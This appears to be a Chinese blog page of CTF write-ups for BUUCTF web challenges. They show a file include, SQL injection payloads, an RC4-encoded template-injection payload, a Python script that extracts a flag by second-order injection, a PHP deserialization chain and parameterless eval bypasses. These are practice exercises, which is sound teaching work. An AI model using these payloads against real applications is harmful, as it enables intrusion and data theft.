<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">       $action = (isset($_GET[&#x27;action&#x27;]) ? $_GET[&#x27;action&#x27;] : &#x27;home.php&#x27;);</span><br><span class="line">       if (file_exists($action)) &#123;</span><br><span class="line">           include $action;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           echo &quot;File not found!&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">       ?&gt;</span><br></pre></td></tr></table></figure>

<p>很快发现文件包含</p>
<p>同时我们发现这里有一个文件包含,上面的代码并没有任何限制,可以利用可控变量action来访问flag</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201909085.png" alt="image-20240620190853439"></p>
<p>October 2019 Twice SQL Injection</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192151163.png" alt="image-20240619215157126"></p>
<p>题目告诉了我二次注入，我就先登录进去看看</p>
<p>随便注册</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192152391.png" alt="image-20240619215237364"></p>
<p>在这一块，输入 ‘ 会被转义，但是我们发现并没有其他的什么特殊限制，所以可以大胆猜测在注册界面二次注入</p>
<p>所以首先，我们尝试一些恶意注册的名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select database() #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192155487.png" alt="image-20240619215549456"></p>
<p>很好，所以之后还是继续爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27; #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192156562.png" alt="image-20240619215634536"></p>
<p>猜测在flag中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192157836.png" alt="image-20240619215718815"></p>
<p>最后爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select flag from flag #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192157802.png" alt="image-20240619215755771"></p>
<p>拿到flag</p>
<p>[CISCN2019 华东南赛区]Double Secret</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192137333.png" alt="image-20240619213707600"></p>
<p>我们首先访问一下screct页面</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192137126.png" alt="image-20240619213758089"></p>
<p>要我们说secret，猜测是传参数secret</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192138993.png" alt="image-20240619213851969"></p>
<p>传1进去是d</p>
<p>传参传长一点试试</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192139377.png"></p>
<p>发现报错，在其中发现源码泄露</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192139280.png" alt="image-20240619213957241"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret==None):</span><br><span class="line">        return &#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><span class="line">    rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">    if &#x27;ciscn&#x27; in a.lower():</span><br><span class="line">Open an interactive python shell in this frame        return &#x27;flag detected!&#x27;</span><br><span class="line">    return a</span><br></pre></td></tr></table></figure>

<p>所以，我们可以发现传进去的参数是被使用rc4解密了，所以我们应该将要传进去的内容进行加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box = list(range(256))  </span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % 256</span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>rc4加密脚本如上</p>
<p>最后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>

<p>将其上传为secret参数</p>
<p>得到flag</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192145367.png" alt="image-20240619214531334"></p>
<p>[网鼎杯2018]Unfinish</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171940478.png" alt="image-20240617193917708"></p>
<p>sql注入是这样的</p>
<p>看了一眼登录界面，什么也没有</p>
<p>放心了</p>
<p>肯定是有注册页面</p>
<p>register.php</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171941008.png" alt="image-20240617194105969"></p>
<p>先随便注册一个</p>
<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406171952499.png" alt="image-20240617195201465"></p>
<p>登录发现回显的用户名</p>
<p>这包的是二次注入的</p>
<p>就是不知道怎么注入</p>
<p>尝试了一下常规注入好像不大行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0</span><br></pre></td></tr></table></figure>

<p>看了一下大佬的wp</p>
<p>通过ascii码来进行读取</p>
<p>同时使用from for代替逗号</p>
<p>同时过滤了information</p>
<p>所以表名只能靠猜，所以猜测是flag</p>
<p>回到题目</p>
<p>这样的注入是因为在一开始尝试了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr(database() from 1 for 1))</span><br></pre></td></tr></table></figure>

<p>发现回显的是字符串所以猜测将上传的username两边加了引号</p>
<p>payload则是为了闭合引号</p>
<p>所以写脚本爆flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">def search():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://fd61fced-c80d-4436-aa4e-b3aa75cf7fae.node5.buuoj.cn:81/&#x27;</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    for i in range(100):</span><br><span class="line">        sleep(0.3)#不加sleep就429了QAQ</span><br><span class="line">        data1 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot; : &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        data2 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;,r2.text)</span><br><span class="line">        res1 = re.search(r&#x27;\d+&#x27;, res.group())</span><br><span class="line">        flag = flag+chr(int(res1.group()))</span><br><span class="line">        print(flag)</span><br><span class="line">    print(&quot;final:&quot;+flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    search()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/MRCTF2020-Ezpop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/MRCTF2020-Ezpop/" class="post-title-link" itemprop="url">[MRCTF2020]Ezpop</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-05-12 16:30:34 / 修改时间：20:55:21" itemprop="dateCreated datePublished" datetime="2024-05-12T16:30:34+08:00">2024-05-12</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>魔术函数介绍：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔法函数：</span><br><span class="line">__invoke():</span><br><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br><span class="line"> </span><br><span class="line">__construct():</span><br><span class="line">创建类对象时自动调用 当使用 new 操作符创建一个类的实例时，构造方法将会自动调用</span><br><span class="line"> </span><br><span class="line">__toString()：</span><br><span class="line">__toString()会在需要转成字符串时, 会隐式自动调用它, 在PHP内部. 这个也是来自JAVA的</span><br><span class="line">当一个对象被当作一个字符串被调用。</span><br><span class="line"> </span><br><span class="line">__wakeup()：</span><br><span class="line">使用unserialize时触发</span><br><span class="line"> </span><br><span class="line">__get()    用于从不可访问的属性读取数据</span><br><span class="line">#难以访问包括：（1）私有属性，（2）没有初始化的属性</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1)通过get传递序列化Show对象参数$pop，此时会对$pop变量进行反序列化从而调用__wakeup()函数</span><br><span class="line"></span><br><span class="line">2)可以看到类Show的函数__construct对变量$this-&gt;source进行echo输出，如果这里的变量$this-&gt;source为Show对象的话，那么就会调用函数_toString()</span><br><span class="line"></span><br><span class="line">3)__toString函数返回了一个变量$this-&gt;str-&gt;soucre，此时类Test中存在__get函数，我们可以将$this-&gt;str赋值为一个Test对象，而Test类中并没有source这个变量，因此将会调用__get函数</span><br><span class="line"></span><br><span class="line">4)类Modifier中存在__invoke函数，可以第三步中类Test的__get函数将this-&gt;p传递给$function并且return $function()，只要将$this-&gt;p赋值为一个Modifier对象，那么就会返回一个Modifier类对象的函数，将会调用Modifier类中的__invoke函数</span><br><span class="line"></span><br><span class="line">5)__invoke函数调用了append函数，只要将变量$var的内容设为我们需要包含的文件伪协议读取命令就可以了</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show();</span><br><span class="line">$b= new Show();</span><br><span class="line">$a-&gt;source=$b;</span><br><span class="line">$b-&gt;str=new Test();</span><br><span class="line">($b-&gt;str)-&gt;p=new Modifier();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A0%3A%22%22%3B%7D</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到flag的base64编码，解码得到flag</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" class="post-title-link" itemprop="url">[GXYCTF2019]禁止套娃</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-05-10 21:28:15 / 修改时间：22:05:11" itemprop="dateCreated datePublished" datetime="2024-05-10T21:28:15+08:00">2024-05-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240510214924514.png" alt="image-20240510214924514"></p>
<p>emm</p>
<p>扫描</p>
<p>git泄露</p>
<p>githack直接拿到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是说禁止了伪协议和很多杂七杂八的东西对吧</p>
<p>但是是要使用伪协议类似的东西看flag的话</p>
<p>我只知道有可能是无参数注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>





<h4 id="无参数注入"><a href="#无参数注入" class="headerlink" title="无参数注入"></a>无参数注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`scandir(&#x27;.&#x27;)`这个函数的作用是扫描当前目录</span><br><span class="line">`localeconv()`函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是`.`</span><br><span class="line">`pos()/current()`函数返回数组第一个值</span><br><span class="line">`array_reverse()`是将数组颠倒</span><br><span class="line">`next()`将数组指针一项下一位</span><br><span class="line">`show_source()`的意思是读取函数内容</span><br></pre></td></tr></table></figure>

<p>三种读取方法</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>使用使上述文件数组反转后取next位即flag.php。然后读取文件<br>构造<code>exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>同上述方法，但方法一有局限性，只能得到数组的第二位或者倒数第二位。其他情况可以使用随机返回键名的方法(刷新几次就可以得到)<br><code>exp=show_source(array_rand(array_flip(scandir(pos(localeconv())))));</code></p>
<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">session_start</span>(): 告诉PHP使用session;</span><br><span class="line"><span class="built_in">session_id</span>(): 获取到当前的session_id值；</span><br><span class="line">手动设置cookie中PHPSESSID=flag.php；</span><br><span class="line">所以可以构造exp=<span class="built_in">show_source</span>(<span class="built_in">session_id</span>(<span class="built_in">session_start</span>()));</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/8/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/10/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">why</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
